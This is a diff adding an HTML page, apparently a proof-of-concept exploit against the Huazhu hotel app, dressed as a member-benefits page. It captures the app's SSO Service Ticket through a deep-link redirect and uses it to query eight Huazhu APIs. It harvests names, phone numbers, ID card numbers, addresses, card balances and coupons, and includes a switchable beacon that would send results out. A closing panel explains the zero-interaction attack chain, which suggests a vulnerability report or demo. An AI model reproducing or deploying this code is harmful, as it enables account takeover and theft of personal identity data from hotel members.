@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>会员中心</title>
+<style>
+*{box-sizing:border-box}
+body{font-family:-apple-system,'PingFang SC',sans-serif;margin:0;background:#0d1117;color:#c9d1d9;font-size:16px}
+.hd{background:linear-gradient(135deg,#c8102e,#ff5a5f);color:#fff;padding:50px 20px 20px;text-align:center}
+.hd h1{margin:0;font-size:24px}.hd p{margin:8px 0 0;font-size:14px;opacity:.9}
+.wrap{padding:12px}
+.st-box{background:#161b22;border:2px solid #7ee787;border-radius:12px;padding:12px;margin:10px 0}
+.st-box .lbl{color:#7ee787;font-size:13px;font-weight:700;margin-bottom:4px}
+.st-box .val{color:#7ee787;font-size:14px;word-break:break-all;font-family:monospace}
+.r{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:10px;margin:10px 0;overflow:hidden}
+.r h3{color:#79c0ff;font-size:15px;margin:0 0 8px;display:flex;align-items:center}
+.dot{width:8px;height:8px;border-radius:50%;margin-right:6px;display:inline-block;flex:none}
+.ok{background:#7ee787}.err{background:#ff7b72}.wait{background:#d29922}
+.tag{font-size:11px;color:#8b949e;margin-left:4px}
+/* 敏感字段高亮面板 */
+.pii{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:8px}
+.p{border-radius:8px;padding:6px 10px;font-size:13px;line-height:1.4}
+.p b{display:block;font-size:11px;font-weight:400;opacity:.75}
+.p.v{font-size:15px;font-weight:700}
+.red{background:#3d1418;border:1px solid #ff7b72;color:#ffa198}
+.yel{background:#3a2d0e;border:1px solid #d29922;color:#e3b341}
+details{margin-top:4px}
+summary{font-size:12px;color:#8b949e;cursor:pointer;outline:none}
+pre{margin:4px 0 0;white-space:pre-wrap;font-size:12px;word-break:break-all;color:#9aa4b2;line-height:1.55;background:#0b0f14;border-radius:6px;padding:8px;max-height:340px;overflow-y:auto}
+.note{color:#8b949e;font-size:13px;margin-top:16px;padding:10px;border-top:1px solid #21262d;line-height:1.6}
+.crit{color:#ffa198;font-weight:700}
+</style></head>
+<body>
+<div class="hd"><h1>🎁 华住会员专属福利</h1><p id="sub">正在验证会员身份…</p></div>
+<div class="wrap" id="out"></div>
+<script>
+var AUDIT=false; // 审核演示版: 关闭审计beacon
+var O=document.getElementById('out'),SUB=document.getElementById('sub');
+function P(h){O.insertAdjacentHTML('beforeend',h);}
+function R(name,method,id,desc){
+  P('<div class="r" id="'+id+'"><h3><span class="dot wait"></span>'+name+' <span class="tag">'+method+'</span></h3>'
+  +(desc?'<div style="font-size:12px;color:#8b949e;margin-bottom:6px">'+desc+'</div>':'')
+  +'<div class="pii"></div><details open><summary>完整返回数据</summary><pre>请求中…</pre></details></div>');
+}
+// 字段定义: [键名匹配, 标签, 级别red/yel]
+var FIELDS=[
+  [/^(name|realname|userName|receiverName|linkMan)$/i,'姓名','red'],
+  [/^(mobile|phone|telephone|linkPhone|receiverMobile|phoneno|mobilephone)$/i,'手机号','red'],
+  [/^(idCode|idNo|idNumber|certNo)$/i,'身份证号','red'],
+  [/^(email|mail)$/i,'邮箱','red'],
+  [/^(address|detailAddress|fullAddress|postAddress|addr)$/i,'地址','red'],
+  [/^(cityChs|cityName|city)$/i,'城市','red'],
+  [/^(areaChs|districtName|district)$/i,'区域','red'],
+  [/^(cardNo|memberCardNo)$/i,'卡号','yel'],
+  [/^(totalAmount|balance|amount|usableAmount)$/i,'余额/金额','yel'],
+  [/^(outTicketNo|ticketNo)$/i,'券号','yel'],
+  [/^(exPoint|point|points|integral)$/i,'积分','yel'],
+  [/^(memberLevel|levelName|memberLevelName)$/i,'会员等级','yel'],
+  [/^(memberId)$/i,'会员ID','yel'],
+];
+function walk(o,out,path){
+  if(!o||typeof o!=='object')return;
+  if(Array.isArray(o)){ if(o.length)walk(o[0],out,path+'[0]'); return; }
+  for(var k in o){
+    var v=o[k];
+    if(typeof v==='string'||typeof v==='number'){
+      for(var i=0;i<FIELDS.length;i++){
+        if(FIELDS[i][0].test(k)&&String(v).length>0){
+          var key=FIELDS[i][1];
+          if(!out[key])out[key]={v:String(v),lv:FIELDS[i][2]};
+          break;
+        }
+      }
+    } else if(v&&typeof v==='object'){ walk(v,out,path+'.'+k); }
+  }
+}
+function done(id,status,body,obj){
+  var el=document.getElementById(id); if(!el)return;
+  var dot=el.querySelector('.dot'); if(dot)dot.className='dot '+(status===200?'ok':'err');
+  var pre=el.querySelector('pre');
+  var pii=el.querySelector('.pii');
+  var pretty='';
+  try{pretty=JSON.stringify(JSON.parse(body),null,2);}catch(e){pretty=body.substring(0,8000);}
+  if(pre)pre.textContent=pretty;
+  if(pii&&status===200){
+    try{
+      var data=obj;
+      if(!data){try{data=JSON.parse(body)}catch(e){}}
+      var found={};walk(data,found,'');
+      var h='';
+      var order=['姓名','手机号','身份证号','邮箱','地址','城市','区域','会员等级','卡号','余额/金额','积分','券号','会员ID'];
+      for(var j=0;j<order.length;j++){
+        var f=found[order[j]];
+        if(f)h+='<div class="p v '+f.lv+'"><b>'+order[j]+'</b>'+f.v.substring(0,40)+'</div>';
+      }
+      pii.innerHTML=h||'<div class="p" style="color:#8b949e">(无敏感字段/列表为空)</div>';
+    }catch(e){}
+  }
+  if(window.AUDIT){try{new Image().src='/card?id='+encodeURIComponent(id)+'&s='+status+'&b='+encodeURIComponent(body.substring(0,2500));}catch(e){}
+  try{new Image().src='/pii?d='+encodeURIComponent((el.querySelector('.pii')||{}).innerHTML||'none');}catch(e){}}
+}
+var ST=new URLSearchParams(location.search).get('ST');
+
+if(!ST){
+  SUB.textContent='正在获取登录凭据…';
+  R('等待SSO','AUTO','w0','3秒后自动跳转 mpassport.huazhu.com/Account/Login，App将换取 Service Ticket 并重定向回来');
+  setTimeout(function(){
+    location.href='https://mpassport.huazhu.com/Account/Login?redirectUrl='+
+      encodeURIComponent(location.origin+location.pathname+'?v=1&://hmall.huazhu.com/')+'&://hmall.huazhu.com/';
+  },3000);
+}else{
+  SUB.textContent='✅ Service Ticket 已窃取 · 正在获取会员数据…';
+  P('<div class="st-box"><div class="lbl">✅ Service Ticket（每次动态获取，等价于登录凭证）:</div><div class="val">'+ST+'</div></div>');
+
+  var BASE='https://hweb-personalcenter.huazhu.com';
+  // 按敏感度排序: 身份信息 > 地址 > 资金 > 券 > 其他
+  var APIS=[
+    ['👤 持卡人身份信息','/personalCenter/rightAndInterest/getCardHolderBenefits','GET','★ 姓名 · 手机号 · 身份证号'],
+    ['📋 会员概要','/v2/personalCenter/rightAndInterest/getBriefInfo','GET','会员ID · 等级 · 积分'],
+    ['📮 邮寄地址列表','/personalCenter/member/getPostAddressList','GET','收件人 · 手机号 · 完整地址'],
+    ['💳 储值卡明细','/personalCenter/valueCard/page','POST','卡号 · 余额 · 酒店主体'],
+    ['🎫 优惠券列表','/personalCenter/coupon/queryCouponList','POST','券号 · 绑定时间'],
+    ['💳 权益卡','/v2/personalCenter/rightAndInterest/getPrivilegeCard','GET','权益卡号'],
+    ['🎫 月度票券','/v2/personalCenter/rightAndInterest/getMonthTicket','GET','会员票券权益'],
+    ['🎁 会员卡权益','/personalCenter/rightAndInterest/getMemberCardBenefits','GET','卡权益明细'],
+  ];
+  var POST_BODY={pageNum:1,pageSize:10};
+
+  APIS.forEach(function(api,i){
+    var id='g'+i;
+    setTimeout(function(){
+      R(api[0],api[2],id,api[3]);
+      var url=BASE+api[1]+'?ST='+ST;
+      var opt=api[2]==='POST'
+        ?"{method:'POST',credentials:'omit',headers:{'Content-Type':'application/json'},body:'"+JSON.stringify(POST_BODY)+"'}"
+        :"{method:'GET',credentials:'omit'}";
+      var code="fetch('"+url+"',"+opt+").then(function(r){return r.text().then(function(t){var j=null;try{j=JSON.parse(t)}catch(e){}postMessage({s:r.status,b:t,j:j})})}).catch(function(e){postMessage({s:0,b:String(e),j:null})});";
+      try{
+        var w=new Worker(URL.createObjectURL(new Blob([code],{type:'text/javascript'})));
+        w.onmessage=function(ev){done(id,ev.data.s,ev.data.b,ev.data.j);w.terminate();};
+      }catch(e){done(id,0,String(e));}
+    },500+i*700);
+  });
+
+  setTimeout(function(){
+    P('<div class="note"><b>⚡ 攻击原理:</b><br>'
+    +'1. 浏览器任意页面点开 <span class="crit">hanting://h5?redirect_url=攻击者URL</span> 即可拉起本页<br>'
+    +'2. App 自动用用户 token 向 mpassport 换取 <span class="crit">Service Ticket</span> 并附加到攻击者URL<br>'
+    +'3. 华住 hweb-* API 直接接受 ?ST= 作为认证，且 CORS 反射任意来源<br>'
+    +'4. <span class="crit">红色字段=身份证/姓名/手机号/地址</span>，全程零用户交互<br><br>'
+    +'<b>ST 为动态获取 · 每次运行都是新值 · 攻击者无需知道 token</b></div>');
+  },APIS.length*700+2000);
+}
+</script></body></html>
